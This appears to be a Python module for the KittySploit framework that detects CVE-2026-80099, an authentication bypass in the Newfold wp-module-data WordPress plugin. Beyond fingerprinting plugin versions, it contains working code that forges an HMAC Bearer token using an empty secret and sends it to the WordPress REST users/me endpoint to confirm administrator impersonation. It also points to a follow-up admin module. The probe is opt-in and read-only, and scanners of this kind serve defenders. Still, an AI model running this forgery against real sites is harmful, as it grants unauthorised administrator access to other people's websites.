#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Newfold wp-module-data <= 2.9.4 Bearer forgery (CVE-2026-80099)."""

from __future__ import annotations

import hashlib
import json
from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_MODULE_DATA = "wp-module-data"
_VULN_HIGH = (2, 9, 4)
_HOSTING_SLUGS = (
    "bluehost-wordpress-plugin",
    "wp-plugin-hostgator",
    "wp-plugin-web",
    "wp-plugin-crazy-domains",
)
_EMPTY_SHA256 = hashlib.sha256(b"").hexdigest()


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Newfold wp-module-data CVE-2026-80099 auth bypass detect",
        "description": (
            "CVE-2026-80099: empty get_auth_token() collapses HMAC secret; forged Bearer "
            "can impersonate administrator on REST."
        ),
        "author": ["KittySploit Team"],
        "severity": "high",
        "cve": "CVE-2026-80099",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-80099",
            "https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2026/CVE-2026-80099.yaml",
        ],
        "modules": ["auxiliary/admin/http/newfold_cve_2026_80099_admin_rest"],
        "tags": ["web", "scanner", "wordpress", "newfold", "auth-bypass", "cve-2026-80099"],
        "agent": {
            "approval_required": True,
            "chain": {
                "suggested_followups": ["auxiliary/admin/http/newfold_cve_2026_80099_admin_rest"],
            },
        },
    }

    active_probe = OptBool(
        False,
        "Forge Bearer token and read /wp-json/wp/v2/users/me (read-only)",
        required=False,
    )

    def _site_origin(self) -> str:
        def opt(name: str, default):
            o = getattr(self, name, None)
            if o is None:
                return default
            return o.value if hasattr(o, "value") else o

        ssl = bool(opt("ssl", True))
        port = int(opt("port", 443))
        host = str(opt("target", "localhost"))
        scheme = "https" if ssl or port == 443 else "http"
        if (scheme == "https" and port == 443) or (scheme == "http" and port == 80):
            return f"{scheme}://{host}"
        return f"{scheme}://{host}:{port}"

    def _module_data_version(self) -> tuple[bool, str]:
        version = self.wp_plugin_version(_MODULE_DATA, "/") or ""
        for slug in _HOSTING_SLUGS:
            if self.wp_plugin_version(slug, "/"):
                return True, version
        readme = self.http_request(
            method="GET",
            path=f"/wp-content/plugins/{_MODULE_DATA}/readme.txt",
            allow_redirects=True,
        )
        if readme and int(readme.status_code) == 200:
            if not version:
                version = self.wp_extract_version_from_readme(readme.text or "") or ""
            return True, version
        for slug in _HOSTING_SLUGS:
            probe = self.http_request(
                method="GET",
                path=f"/wp-content/plugins/{slug}/",
                allow_redirects=True,
            )
            if probe and int(probe.status_code) in (200, 403):
                return True, version
        return False, version

    def _newfold_verify_surface(self) -> bool:
        resp = self.http_request(
            method="GET",
            path="/wp-json/newfold-data/v1/verify/00000000000000000000000000000000",
            headers={"Accept": "application/json"},
            allow_redirects=True,
        )
        if not resp or int(resp.status_code) == 404:
            return False
        return '"valid"' in (resp.text or "")

    def _forged_bearer(self, origin: str) -> str:
        esc_url = origin.replace("/", "\\/") + "\\/wp-json\\/wp\\/v2\\/users\\/me?context=edit"
        ts = "0"
        payload = json.dumps(
            {"method": "GET", "url": esc_url, "body": "", "timestamp": ts},
            separators=(",", ":"),
        )
        data_hash = hashlib.sha256(payload.encode()).hexdigest()
        return hashlib.sha256(f"{data_hash}{_EMPTY_SHA256}".encode()).hexdigest()

    def _probe_admin_rest(self, origin: str) -> bool:
        token = self._forged_bearer(origin)
        resp = self.http_request(
            method="GET",
            path="/wp-json/wp/v2/users/me?context=edit",
            headers={
                "Authorization": f"Bearer {token}",
                "X-Timestamp": "0",
                "Accept": "application/json",
            },
            allow_redirects=True,
        )
        if not resp or int(resp.status_code) != 200:
            return False
        body = resp.text or ""
        return '"roles"' in body and "administrator" in body

    def run(self):
        present, version = self._module_data_version()
        if not present:
            return False
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        if not self._newfold_verify_surface():
            self.set_info(
                severity="info",
                cve="CVE-2026-80099",
                reason="Newfold hosting plugin present but newfold-data verify API absent",
                version=version or "unknown",
            )
            return False
        if not self.active_probe:
            self.set_info(
                severity="high",
                cve="CVE-2026-80099",
                reason=(
                    f"Newfold wp-module-data {version or 'unknown'} + verify API; "
                    "Bearer forgery not attempted"
                ),
                version=version or "unknown",
            )
            return True
        origin = self._site_origin()
        if not self._probe_admin_rest(origin):
            return False
        self.set_info(
            severity="critical",
            cve="CVE-2026-80099",
            reason="Forged Bearer returned administrator on /wp/v2/users/me",
            version=version or "unknown",
            confidence="high",
        )
        return True
